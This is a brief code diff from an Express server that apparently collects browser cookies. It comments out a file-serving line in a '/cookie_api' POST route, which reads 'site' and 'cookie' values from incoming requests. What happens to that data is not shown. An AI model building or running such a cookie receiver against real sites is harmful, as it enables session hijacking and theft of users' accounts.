@@ -26,7 +26,7 @@ app.get('/', function (req, res) {
 });
 
 app.post('/cookie_api', function(req, res){
-	res.sendFile(path.join(__dirname + '/collector.html'));
+	//res.sendFile(path.join(__dirname + '/collector.html'));
 	var data = req.body;
 	var site = data['site'];
 	var cookie = data['cookie'];
